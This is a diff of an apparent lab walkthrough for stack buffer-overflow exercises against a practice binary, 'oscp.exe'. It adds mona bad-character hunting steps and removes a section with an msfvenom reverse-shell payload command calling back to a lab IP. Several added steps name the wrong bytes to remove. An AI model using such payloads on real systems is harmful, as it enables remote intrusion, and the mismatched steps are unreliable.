@@ -486,7 +486,7 @@ Repeat the steps outlined in Task 2 but for the OVERFLOW2 command.
   
     `!mona bytearray -b "\x00"`
 
-    ![task3-bytearray](./images/task3-bytearray.png)
+    ![task2-bytearray](./images/task2-bytearray.png)
 
   * Now we need to generate a string of bad chars from `\x01` to `\xff` that is identical to the bytearray. Use the python script (`bytegen.py`)
   
@@ -600,40 +600,6 @@ Repeat the steps outlined in Task 2 but for the OVERFLOW2 command.
 
     So finally we got our BADCHARS **00 23 3c 83 ba**
 
-* Let’s find the jump point using the mona command again
-  
-    ```
-    !mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"
-    ```
-
-    ![task2-jmp](./images/task2-jmp.png)
-
-    Note the address **625011AF** => **62 50 11 AF** => **\xaf\x11\x50\x62** written backwards since the system is little endian
-
-  * Update your `exploit.py` script, setting the retn variable to the address `\xaf\x11\x50\x62`
-  
-    ![task2-retn2](./images/task2-retn2.png)
-
-  * Generate a reverse shell payload using msfvenom, making sure to exclude the same bad chars that were found previously
-  
-    ```
-    msfvenom -p windows/shell_reverse_tcp LHOST=10.17.127.233 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
-    ```
-
-    ![task2-msfvenom](./images/task2-msfvenom.png)
-
-  * Update `exploit.py` script and set the payload variable to the string of generated C code, also add variable padding to  `"\x90" * 16`
-   
-    ![task2-exploit](./images/task2-exploit.png)
-
-  * Start up a listener with netcat
-  
-    ![task2-listener](./images/task2-listener.png)
-
-  * Restart oscp.exe in immunity, run `exploit.py` again and we get the shell
-
-    ![task2-shell](./images/task2-shell.png)
-
 ## Task 4 - oscp.exe - OVERFLOW3
 
 Repeat the steps outlined in Task 2 but for the OVERFLOW3 command.
@@ -695,6 +661,116 @@ Repeat the steps outlined in Task 2 but for the OVERFLOW5 command.
     ![task6-offset](./images/task6-offset.png) 
 
 * In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW5?
+
+  `\x00\x16\x2f\xf4\xfd`
+
+  * Update `exploit.py` script, set the offset variable to EIP offset value, set the payload variable to an empty string and set the retn variable to "BBBB"
+  
+    ![task6-payload2](./images/task6-payload2.png)
+
+  * Restart `oscp.exe` in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. **42424242**)
+  
+    ![task2-buffer](./images/task2-buffer.png)
+
+    ![task6-EIP](./images/task6-EIP.png)
+
+  * Restart `oscp.exe` in Immunity and generate a bytearray using mona, and exclude the null byte (`\x00`) by default
+  
+    `!mona bytearray -b "\x00"`
+
+    ![task2-bytearray](./images/task2-bytearray.png)
+
+  * Now we need to generate a string of bad chars from `\x01` to `\xff` that is identical to the bytearray. Use the python script (`bytegen.py`)
+  
+    ```
+    for x in range(1, 256):
+      print("\\x" + "{:02x}".format(x), end='')
+    print()
+    ```
+
+    ![task2-bytegen](./images/task2-bytegen.png)
+
+  * Update `exploit.py` script and set the payload variable to the string of badchars the script generates
+  
+    ![task6-badchar](./images/task6-badchar.png)
+
+  * Run `exploit.py` and take note of the address to which the ESP register points
+  
+    ![task2-buffer](./images/task2-buffer.png)
+
+    ![task6-ESP1](./images/task6-ESP1.png)
+
+  * Run following mona command
+  
+    ```
+    !mona compare -f C:\mona\oscp\bytearray.bin -a 019DFA30
+    ```
+
+    ![task6-badchars1](./images/task6-badchars1.png)
+
+    So we found a list of possible bad chars **00 16 17 2f 30 f4 f5 fd**
+
+  * Restart oscp.exe in immunity, created a new bytearray and removed `\x00\x16`
+  
+    ```
+    !mona bytearray -b "\x00\x16"
+    ```
+
+  * Edit `exploit.py` remove `\x23` from payload variable and run `exploit.py`
+  
+    ![task2-buffer](./images/task2-buffer.png)
+
+    ![task6-ESP2](./images/task6-ESP2.png)
+
+  * Check ESP value and run compare mona again
+  
+    ```
+    !mona compare -f C:\mona\oscp\bytearray.bin -a 01ADFA30
+    ```
+
+    ![task6-badchars2](./images/task6-badchars2.png)
+
+  * Restart `oscp.exe` in immunity, created a new bytearray and removed `\x00\x16\x2f`
+  
+    ```
+    !mona bytearray -b "\x00\x16\x2f"
+    ```
+
+  * Edit `exploit.py` remove `\x3c` from payload variable and run `exploit.py`
+  
+    ![task2-buffer](./images/task2-buffer.png)
+
+    ![task6-ESP3](./images/task6-ESP3.png)
+    
+  * Check ESP value and run compare mona again
+  
+    ```
+    !mona compare -f C:\mona\oscp\bytearray.bin -a 019FFA30
+    ```
+
+    ![task6-badchars3](./images/task6-badchars3.png)
+
+  * Restart `oscp.exe` in immunity, created a new bytearray and removed `\x00\x16\x2f\xf4`
+  
+    ```
+    !mona bytearray -b "\x00\x16\x2f\xf4"
+    ```
+
+  * Edit `exploit.py` remove `\x83` from payload variable and run `exploit.py`
+  
+    ![task2-buffer](./images/task2-buffer.png)
+
+    ![task6-ESP4](./images/task6-ESP4.png)
+
+  * Check ESP value and run compare mona again
+  
+    ```
+    !mona compare -f C:\mona\oscp\bytearray.bin -a 0180FA30
+    ```
+
+    ![task6-badchars4](./images/task6-badchars4.png)
+
+    So finally we got our BADCHARS **00 16 2f f4 fd**
 
 ## Task 7 - oscp.exe - OVERFLOW6
 
